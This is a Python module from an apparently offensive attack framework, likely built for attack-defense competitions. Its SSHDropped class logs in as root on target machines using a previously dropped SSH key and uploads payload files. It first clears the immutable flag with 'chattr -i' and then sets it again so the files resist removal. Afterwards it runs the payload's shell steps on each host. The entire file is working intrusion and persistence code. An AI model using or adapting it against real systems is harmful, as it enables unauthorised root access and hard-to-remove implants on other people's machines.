#!/usr/bin/python3

from .base import Module
import socket
import time
from pwnlib.tubes.ssh import ssh
from ..payloads.basicpayload import BasicPayload
from ..utils import logging

class SSHDropped(Module):
    """Exploits the ssh default passwords (Secondary Module)"""

    payload = BasicPayload() # No payload required

    def detect(self, target):
        """Try to connect with the default credentials"""
        try:
            s = ssh(host=target['ip'], user="root", keyfile="../../keys/key1",
                    timeout=0.25)
            return s
        except:
            logging.failure(target, "Dropped creds not working.")
            return None

    def compromise(self, target, detect_val):
        """Perform the exploitation"""

        # detect_val should be ssh shell we used to test for compromise
        # Saves an open socket

        try:
            for i in self.payload.files.keys():
                detect_val.shell("chattr -i %s" % self.payload.files[i])
                try:
                    detect_val.upload_file(i, self.payload.files[i])
                except:
                    logging.failure(target, "Unable to upload %s to %s." %
                                    (i, self.payload.files[i])
                                    )
                detect_val.shell("chattr +i %s" % self.payload.files[i])

            for i in self.payload.steps():
                if type(i) == float:
                    time.sleep(i)
                else:
                    detect_val.shell(i)

            detect_val.close()
            logging.success(target, "Dropped SSH credentials exploited.")
        except:
            import traceback
            traceback.print_exc()

        return True

